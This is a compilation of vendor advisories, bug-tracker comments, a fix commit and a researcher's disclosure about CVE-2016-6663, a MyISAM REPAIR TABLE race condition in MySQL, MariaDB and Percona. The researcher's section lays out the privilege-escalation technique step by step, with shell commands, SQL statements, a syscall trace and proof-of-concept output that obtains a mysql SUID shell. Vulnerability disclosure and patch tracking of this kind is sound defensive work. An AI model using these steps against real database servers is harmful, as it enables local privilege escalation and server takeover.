## What cybersecurity professionals are saying

     ![Duane LaFlotte](/_astro/duane.CAyBZp_-.png)
### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)

| [Description](show_bug.cgi?id=1378936#c0)  Tomas Hoger    2016-09-23 14:35:00 UTC  ``` Dawid Golunski, reporter of [CVE-2016-6662](https://access.redhat.com/security/cve/CVE-2016-6662) ([bug 1375198](show_bug.cgi?id=1375198 "CLOSED ERRATA - CVE-2016-6662 mysql: general_log can write to configuration files, leading to privilege escalation (CPU Oct 2016)")), mentioned existence of a privilege escalation vulnerability which should allow a non-privileged database user without FILE permissions to escalate their privileges to database or system administrator.  Quoting from the advisory for CVE-2016-6662:  <http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt>    It could also be combined with [CVE-2016-6663](https://access.redhat.com/security/cve/CVE-2016-6663) vulnerability which will be released   shortly and could allow certain attackers to escalate their privileges to root    even without FILE privilege.  No further details are available at the moment.   ```  [Comment 3](show_bug.cgi?id=1378936#c3)  Tomas Hoger    2016-10-25 07:57:12 UTC  ``` This issue is now listed as fixed in MariaDB versions 5.5.52 and 10.1.18:  <https://mariadb.com/kb/en/mariadb/mariadb-5552-release-notes/> <https://mariadb.com/kb/en/mariadb/mariadb-10118-release-notes/>  According to MariaDB upstream, the CVE is for race condition issue fixed in this commit:  <https://github.com/MariaDB/server/commit/347eeefbfc658c8531878218487d729f4e020805>  Corresponding MySQL commit is:  <https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291>  and it was applied in MySQL versions 5.5.52, 5.6.33, and 5.7.15.   ```  [Comment 4](show_bug.cgi?id=1378936#c4)  Tomas Hoger    2016-10-25 08:00:03 UTC  ``` We also believe that Oracle decided to assign a duplicate CVE id for this issue - [CVE-2016-5616](https://access.redhat.com/security/cve/CVE-2016-5616) tracked via [bug 1386562](show_bug.cgi?id=1386562 "CLOSED DUPLICATE - CVE-2016-5616 mysql: unspecified vulnerability in subcomponent: Server: MyISAM (CPU October 2016)").

The original flaw reporter has now also confirmed that the [CVE-2016-5616](https://access.redhat.com/security/cve/CVE-2016-5616) is a duplicate id for the issue that originally got [CVE-2016-6663](https://access.redhat.com/security/cve/CVE-2016-6663).  His advisory also notes that the setting of symbolic-links = 0 (which is used by default in all MySQL and MariaDB packages for Red Hat Enterprise Linux 6 and later) mitigates this issue.

Copying the whole text of [bug 1386562 comment 4](show_bug.cgi?id=1386562#c4 "CLOSED DUPLICATE - CVE-2016-5616 mysql: unspecified vulnerability in subcomponent: Server: MyISAM (CPU October 2016)") here, as [bug 1386562](show_bug.cgi?id=1386562 "CLOSED DUPLICATE - CVE-2016-5616 mysql: unspecified vulnerability in subcomponent: Server: MyISAM (CPU October 2016)") was closed as duplicate of this bug.  --  The only change in MyISAM sub-component of MySQL in the listed versions is:  <https://github.com/mysql/mysql-server/commit/4e5473862e6852b0f3802b0cd0c6fa10b5253291>  To exploit this flaw, attacker needs to have a local shell access on the server running MySQL server, and have write access to the data directory used to store database files.  The data directory is normally only writeable to the mysql system user, who has full control over database files anyway.  However, MyISAM engine allows users creating database tables to specify location where data files are stored using DATA DIRECTORY and INDEX DIRECTORY clauses for CREATE TABLE.  That way, database files can be stored in any directory writeable to a local user.  The DATA DIRECTORY and INDEX DIRECTORY clause is only applied when mysqld is running with symlink support enabled.  The symlinks support is controlled via symbolic-links configuration directive and --symbolic-links / --skip-symbolic-links command line options.  The default configuration of all MySQL and MariaDB packages on Red Hat Enterprise Linux 6 and later is to disable symlink support - symbolic-links=0 setting is used in the default my.cnf.  With this setting, only mysql system user should be able to exploit this flaw.  The mysql packages on Red Hat Enterprise Linux 5 have symlink support enabled by default, however, Red Hat has been recommending disabling symlink support since 2010:  <https://rhn.redhat.com/errata/RHSA-2010-0109.html>   ```  [Comment 23](show_bug.cgi?id=1378936#c23)  errata-xmlrpc    2016-11-15 11:30:51 UTC  ``` This issue has been addressed in the following products:    Red Hat Software Collections for Red Hat Enterprise Linux 6   Red Hat Software Collections for Red Hat Enterprise Linux 6.7 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7   Red Hat Software Collections for Red Hat Enterprise Linux 7.1 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.2 EUS  Via RHSA-2016:2749 <https://rhn.redhat.com/errata/RHSA-2016-2749.html>   ```  [Comment 27](show_bug.cgi?id=1378936#c27)  errata-xmlrpc    2016-12-08 16:06:46 UTC  ``` This issue has been addressed in the following products:    Red Hat Software Collections for Red Hat Enterprise Linux 6.7 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.3 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 6   Red Hat Software Collections for Red Hat Enterprise Linux 7   Red Hat Software Collections for Red Hat Enterprise Linux 7.2 EUS  Via RHSA-2016:2928 <https://rhn.redhat.com/errata/RHSA-2016-2928.html>   ```  [Comment 28](show_bug.cgi?id=1378936#c28)  errata-xmlrpc    2016-12-08 16:12:51 UTC  ``` This issue has been addressed in the following products:    Red Hat Software Collections for Red Hat Enterprise Linux 6   Red Hat Software Collections for Red Hat Enterprise Linux 6.7 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7   Red Hat Software Collections for Red Hat Enterprise Linux 7.2 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.3 EUS  Via RHSA-2016:2927 <https://rhn.redhat.com/errata/RHSA-2016-2927.html>   ```  [Comment 29](show_bug.cgi?id=1378936#c29)  errata-xmlrpc    2017-01-24 11:46:20 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6  Via RHSA-2017:0184 <https://rhn.redhat.com/errata/RHSA-2017-0184.html>   ``` |  |

Bug#24388746: PRIVILEGE ESCALATION AND RACE CONDITION USING CREATE TABLE

```
During REPAIR TABLE of a MyISAM table, a temporary data file (.TMD)
is created. When repair finishes, this file is renamed to the original
.MYD file. The problem was that during this rename, we copied the
stats from the old file to the new file with chmod/chown. If a user
managed to replace the temporary file before chmod/chown was executed,
it was possible to get an arbitrary file with the privileges of the
mysql user.

This patch fixes the problem by not copying stats from the old
file to the new file. This is not needed as the new file was
created with the correct stats. This fix only changes server
behavior - external utilities such as myisamchk still does
chmod/chown.

No test case provided since the problem involves synchronization
with file system operations.

III. INTRODUCTION
-------------------------

An independent research has revealed a race condition vulnerability which is
present in MySQl, MariaDB and Percona databases.

The vulnerability can allow a local system user with access to the affected
database in the context of a low-privileged account (CREATE/INSERT/SELECT grants)
to escalate their privileges and execute arbitrary code as the database system
user (typically 'mysql').

Successful exploitation would allow an attacker to gain access to all of the
databases stored on the affected database server.

The obtained level of access upon the exploitation, could be chained with
the other privilege escalation vulnerabilities discovered by the author of
this advisory (CVE-2016-6662 and CVE-2016-6664) to further escalate privileges
from mysql user to root user and thus allow attackers to fully compromise the
target server.

IV. DESCRIPTION
-------------------------

Table locations
~~~~~~~~~~~~~~~~~~

MySQL-based databases allow users with CREATE table privilege to optionally
specify a disk path of the directory where the table will be stored via a DATA
DIRECTORY parameter in the CREATE statement.

Users who have access to a database account with CREATE grant could create a
table under a directory that they can control. For example:

attacker@debian:~$ mkdir /tmp/disktable
attacker@debian:~$ chmod 777 /tmp/disktable/
attacker@debian:~$ ls -ld /tmp/disktable/
drwxrwxrwx 2 attacker attacker 4096 Oct 28 10:53 /tmp/disktable/

A user could then place a table within the directory with the following SQL
statement:

mysql> CREATE TABLE poctab1 (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/disktable';

which would result in creating the following table file:

attacker@debian:~$ ls -l /tmp/disktable/
total 0
-rw-rw---- 1 mysql mysql 0 Oct 28 10:53 poctab1.MYD

Race Condition
~~~~~~~~~~~~~~~~~~

Observing file operations performed on the table stored within the directory,
it was discovered that REPAIR TABLE SQL statement which is available to
low-privileged users with SELECT/CREATE/INSERT grants, performed unsafe
operations on temporary files created during the table repair process.

Executing the statement:

mysql> REPAIR TABLE `poctab1`;
+----------------+--------+----------+----------+
| Table          | Op     | Msg_type | Msg_text |
+----------------+--------+----------+----------+
| testdb.poctab1 | repair | status   | OK       |
+----------------+--------+----------+----------+

would result in execution of the following system calls:

[pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
[pid  1463] open("/tmp/disktable/poctab1.MYD", O_RDWR) = 65
[pid  1463] access("./testdb/poctab1.TRG", F_OK) = -1 ENOENT (No such file or directory)
[pid  1463] lseek(65, 0, SEEK_CUR)      = 0
[pid  1463] lseek(65, 0, SEEK_END)      = 0
[pid  1463] mprotect(0x7f6a3804f000, 12288, PROT_READ|PROT_WRITE) = 0
[pid  1463] open("/tmp/disktable/poctab1.TMD", O_RDWR|O_CREAT|O_EXCL|O_TRUNC, 0660) = 66
[pid  1463] lseek(65, 0, SEEK_END)      = 0
[pid  1463] lseek(64, 0, SEEK_END)      = 1024
[pid  1463] close(65)                   = 0
[pid  1463] close(66)                   = 0
[pid  1463] lstat("/tmp", {st_mode=S_IFDIR|S_ISVTX|0777, st_size=4096, ...}) = 0
[pid  1463] lstat("/tmp/disktable", {st_mode=S_IFDIR|0777, st_size=4096, ...}) = 0
[pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
[pid  1463] stat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
[pid  1463] chmod("/tmp/disktable/poctab1.TMD", 0660) = 0
[pid  1463] chown("/tmp/disktable/poctab1.TMD", 110, 115) = 0
[pid  1463] unlink("/tmp/disktable/poctab1.MYD") = 0
[pid  1463] rename("/tmp/disktable/poctab1.TMD", "/tmp/disktable/poctab1.MYD") = 0

The first call:

[pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0

was found to check file permissions of poctab1.MYD table which are then copied with chmod()
to the newly created poctab1.TMD temporary file containing the repaired table.

The code is vulnerable to Race Condition between the call:

[pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0

and

[pid  1463] chmod("/tmp/disktable/poctab1.TMD", 0660) = 0

If an attacker managed to unlink the temporary table poctab1.TMD and replace it
with a symlink to /var/lib/mysql before the chmod() operation (i.e. win the race),
they would be able to apply arbitrary permissions on the data directory.
The attacker would be able to control the set of permissions by pre-setting them on
poctab1.MYD file before executing the REPAIR TABLE statement.
For example, by setting the permissions of poctab1.MYD to 777 the data directory
would become readable and writable to the attacker.

Obtaining mysql-suid shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Apart from gaining access to arbitrary mysql files, the attacker could also
achieve arbitrary code execution in the context of mysql user (mysql shell).

This could be done by first pre-setting permissions on poctab1.MYD to 04777
(suid), and winning the race so that the permissions get applied on a copy
of a bash shell file through the vulnerable chmod() call effectively creating
a shell that elevates their permissions after execution.

There is only one problem. Their suid shell would remain to be owned by the
attacker's user id and not 'mysql' user.

To elevate their privileges, attacker would need to copy the bash shell to a
mysql-owned table file which are owned by mysql user.  However mysql table
files are not writable by other users making it impossible for attacker to save
the shell.

This could be bypassed if attacker created a specially crafted directory
with a group sticky bit and then created a second table named 'poctab2' as
follows:

attacker@debian:/tmp/disktable$ chmod g+s /tmp/disktable/
attacker@debian:/tmp/disktable$ ls -ld /tmp/disktable/
drwxrwsrwx 2 attacker attacker 4096 Oct 28 11:25 /tmp/disktable/

mysql> CREATE TABLE poctab2 (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/disktable';
Query OK, 0 rows affected (0.00 sec)

attacker@debian:/tmp/disktable$ ls -l /tmp/disktable/
total 0
-rw-rw---- 1 mysql mysql    0 Oct 28 11:04 poctab1.MYD
-rw-rw---- 1 mysql attacker 0 Oct 28 11:34 poctab2.MYD

As we can see poctab2.MYD table (thanks to the sticky bit (+s) on the permissions
of the group on disktable directory)  has 'mysql' as the owner but 'attacker'
as the group.
Therefore, the attacker would now be able to copy /bin/bash to poctab2.MYD file
and preserve the file owner.

Finally, they could exploit the Race Condition again and have SUID + exec
permissions applied on poctab2.MYD which would then allow them to execute the suid
shell with elevated privileges of the mysql user.

From mysql to root
~~~~~~~~~~~~~~~~~~~~~~~~

After obtaining a mysql suid shell, attackers could then exploit one of the
other MySQL vulnerabilities discovered by the author of this advisory:

CVE-2016-6662
or
CVE-2016-6664 / (Oracle) CVE-2016-5617

to escalate their privileges from mysql user to root system user.

MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit
mysql-privesc-race.c (ver. 1.0)

CVE-2016-6663 / CVE-2016-5616

For testing purposes only. Do no harm.

Discovered/Coded by:

Dawid Golunski
<http://legalhackers.com>

[+] Starting the exploit as:
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)

[+] Connecting to the database `pocdb` as attacker@localhost

[+] Creating exploit temp directory /tmp/mysql_privesc_exploit

[+] Creating mysql tables

DROP TABLE IF EXISTS exploit_table
DROP TABLE IF EXISTS mysql_suid_shell
CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit'
CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/mysql_privesc_exploit'

[+] Copying bash into the mysql_suid_shell table. After the exploitation the following file/table will be assigned SUID and executable bits :
-rw-rw---- 1 mysql attacker 1037528 Nov  1 02:33 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Entering the race loop... Hang in there...

[+] Bingo! Race won (took 5 tries) ! Check out the mysql SUID shell:

-rwsrwxrwx 1 mysql attacker 1037528 Nov  1 02:33 /tmp/mysql_privesc_exploit/mysql_suid_shell.MYD

[+] Spawning the mysql SUID shell now...
    Remember that from there you can gain root with vuln CVE-2016-6662 or CVE-2016-6664 :)

VI. BUSINESS IMPACT
-------------------------

Malicious local users with DB access granted a common set of privileges
(SELECT/INSERT/CREATE) could exploit this vulnerability to execute arbitrary
code and escalate their privileges to mysql system user. This would allow them
to gain access to all of the databases stored on the server as well as exploit
CVE-2016-6662 or CVE-2016-6664 vulnerabilities to further elevate privileges
to root system user (rootshell) and fully compromise the target server.

This vulnerability could for example be exploited by malicious users in a shared
hosting environment where each user is supposed to have access to only one
database assigned to them.
It could also be exploited by attackers who have managed to find a vulnerability
in a website and gained access to the target system as a low-privileged user
(such as apache/www-data).

VII. SYSTEMS AFFECTED
-------------------------

MariaDB
	< 5.5.52
	< 10.1.18
        < 10.0.28

MySQL
	<= 5.5.51
	<= 5.6.32
	<= 5.7.14

Percona Server
	< 5.5.51-38.2
	< 5.6.32-78-1
	< 5.7.14-8

Percona XtraDB Cluster
	< 5.6.32-25.17
	< 5.7.14-26.17
	< 5.5.41-37.0

VIII. SOLUTION / VENDOR RESPONSE
-------------------------

The race condition vulnerability was reported to Oracle in July 2016
(together with the previously reported critical issue of CVE-2016-6662).

All of the vendors - MariaDB/MySQL/Percona have received a copy of this
advisory in advance which allowed them to produce patches for this
vulnerability before the release of this advisory.

When checking if your system contains the patches, note that this vulnerability
has been known under two CVE IDs:

CVE-2016-6663
CVE-2016-5616 (Oracle)

CVE-2016-6663 is the original CVE that was agreed to be used by all the
affected vendors.
The issue was however mentioned in Oracle CPU mistakenly under a new CVE of
CVE-2016-5616, resulting in a duplicate. Oracle has informed that CPU will be
updated to state that CVE-2016-5616 is equivalent to CVE-2016-6663.

Patches and security releases have been issued by the vendors and can
be found on the official vendor websites (see references below which contain
links to advisories issued by each vendor).

As a temporary mitigation, you can disable symbolic link support in the
database server configuration with the following my.cnf config setting:

symbolic-links = 0

Nevertheless, an update to a patched release is recommended.

# Percona responds to CVE-2016-6663 and CVE-2016-6664

November 2, 2016

[David Busby](https://www.percona.com/blog/author/david-busby)

[![CVE-2016-6663 and CVE-2016-6664](data:image/svg+xml...)](https://www.percona.com/blog/wp-content/uploads/2016/11/CVE-2016-6663-and-CVE-2016-6664.jpg)Percona has addressed CVE-2016-6663 and CVE-2016-6664 in releases of Percona Server for MySQL and Percona XtraDB Cluster.

Percona is happy to announce that the following vulnerabilities are fixed in current releases of Percona Server for MySQL and Percona XtraDB Cluster:

* [CVE-2016-6663](https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html): allows a local system user with access to the affected database in the context of a low-privileged account (CREATE/INSERT/SELECT grants) to escalate their privileges and execute arbitrary code as the database system user (typically “mysql”).
* [CVE-2016-6664](https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html): can let attackers who have gained access to mysql system user to further escalate their privileges to root user allowing them to fully compromise the system.

Users should **upgrade to their relevant incremental release**.

**Percona Server**

* [5.5.51-38.2](https://www.percona.com/doc/percona-server/5.5/release-notes/Percona-Server-5.5.51-38.1.html#module-5.5.51-38.1)
* [5.6.32-78-1](https://www.percona.com/doc/percona-server/5.6/release-notes/Percona-Server-5.6.32-78.1.html)
* [5.7.14-8](https://www.percona.com/doc/percona-server/5.7/release-notes/Percona-Server-5.7.14-8.html#module-5.7.14-8)

**Percona XtraDB Cluster**

* [5.5.41-37.0](https://www.percona.com/downloads/Percona-XtraDB-Cluster/LATEST/source/)
* [5.6.32-25.17](https://www.percona.com/doc/percona-xtradb-cluster/5.6/release-notes/Percona-XtraDB-Cluster-5.6.32-25.17.html#module-5.6.32-25.17)
* [5.7.14-26.17](https://www.percona.com/downloads/Percona-XtraDB-Cluster-57/LATEST/)

Users should update as soon as is practical to ensure protection from these vulnerabilities.

Percona would like to thank Dawid Golunski ([https://legalhackers.com](https://legalhackers.com/)) for disclosing this issue.

Your description for -6664 is totally wrong, you apparently, copy-pasted a description of a different vulnerability there

This does look incorrect, I will advise marketing of the error.

In fact, -6663 looks wrong too

CVE-2016-6663 description was taken from the advisory linked

 0   ![Sergei Golubchik](data:image/svg+xml...) Sergei Golubchik    Reply to   [David Busby](#comment-10967283)   8 years ago

Indeed, you are right. It is correct, strictly speaking. It just doesn’t mention the race condition, or REPAIR, or OPTIMIZE, or MyISAM, only CREATE/INSERT/SELECT, which aren’t used in this vulnerability at all. So it appears to look incorrectly and that was confusing. Sorry.

 0  ![etpropschroeder](data:image/svg+xml...) etpropschroeder    8 years ago

Just for clarity, the listed Percona Server/XtraDB Cluster versions are in fact patched, and not the most recent unpatched versions?

The versions noted in the post contain the fixes, of course I would recommend however that you use the latest version to ensure you have all of the most recent fixes.

 0  ![CasBuac7Kee](data:image/svg+xml...) CasBuac7Kee    8 years ago

Some of us still use the old 5.1 series of Percona Server. Any chance to backport these security fixes to the old 5.1 series?

 0   [![David Busby](data:image/svg+xml...)](https://www.percona.com/blog/author/david-busby/) [David Busby](https://www.percona.com) Author    Reply to   [CasBuac7Kee](#comment-10967307)   8 years ago

I will ask our development team, however given 5.1 went EOL in 2013 I would strongly recommend you look to upgrade as soon as possible!

 0   ![CasBuac7Kee](data:image/svg+xml...) CasBuac7Kee    Reply to   [David Busby](#comment-10967310)   8 years ago

Thank you for your help! Unfortunately upgrade is not always an option, and not always my decision (due the tight software dependency).

Please note MySQL 5.1 is still supported and will supported until 2020 on RHEL6 (and their derivates CentOS6, Scientific Linux 6). But the Percona Server 5.1 is lot more tuned and has more administrative features for production workload, than the original version. So I would prefer to stay on the Percona Server 5.1 instead of replacing it with the untuned distro version. As Redhat will eventually release the fixes (as source code), your security team could also use it as a patch source. I would be really helpful if the security team at least integrate the security patches released by Redhat to the Percona Server 5.1 series, and rebuild the packages.

Thanks for your help!

I’ve had a response from our developers and that is that Percona Server 5.1 will move to “Customized support”, which essential is EOL unless someone pays for a release and backports. As such our recommendation is to upgrade to at least 5.5 as soon as possible.

The CVE-2016-6663 could also successfully executed and gain a shell with mysql user on Percona-Server-server-51-5.1.73-rel14.12.624.rhel6.x86\_64 ….

 0  ![Nicholas](data:image/svg+xml...) Nicholas    8 years ago

There seems to be no change in the percona-xtradb-cluster-5.5 between version 5.5.41-25.11.1 and 5.5.41-37.0. Are we sure this has the right fix? If so that seems to suggest the fix was in place back in Sept.

 0   ![Nicholas](data:image/svg+xml...) Nicholas    Reply to   [Nicholas](#comment-10967335)   8 years ago

I meant between 5.5.41-25.12-855 and 5.5.41-37.0

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2927)

## Topic

An update for rh-mariadb100-mariadb is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server. For all practical purposes, MariaDB is binary-compatible with MySQL.

The following packages have been upgraded to a newer upstream version: rh-mariadb100-mariadb (10.0.28).

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-5630, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2928)

## Topic

An update for rh-mariadb101-mariadb is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server. For all practical purposes, MariaDB is binary-compatible with MySQL.

The following packages have been upgraded to a newer upstream version: rh-mariadb101-mariadb (10.1.19).

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663, CVE-2016-5616)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

# Oracle Critical Patch Update Advisory - October 2016

## Oracle Critical Patch Update Advisory - October 2016

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 253 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

Please note that the vulnerabilities in this Critical Patch Update are scored using version 3.0 of Common Vulnerability Scoring Standard (CVSS).

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available [here](/security-alerts/cpufaq.html#CVRF).

### Affected Products and Components

#### Note:

* Vulnerabilities affecting Oracle Database and Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Users running Java SE with a browser can download the latest release from [http://java.com](http://java.com/). Users on the Windows and Mac OS X platforms can also use automatic updates to get the latest release.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2160904.1) for information on minimum revisions of security fixes required to resolve ZFSSA issues published in Critical Patch Updates (CPUs) and Solaris Third Party bulletins.
* Users can download the latest release of Netbeans from [http://netbeans.org](http://netbeans.org/). Users running earlier versions of Netbeans can use automatic updates to get the latest patches.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is [here](/security-alerts/cpuoct2016verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](http://cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.0).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

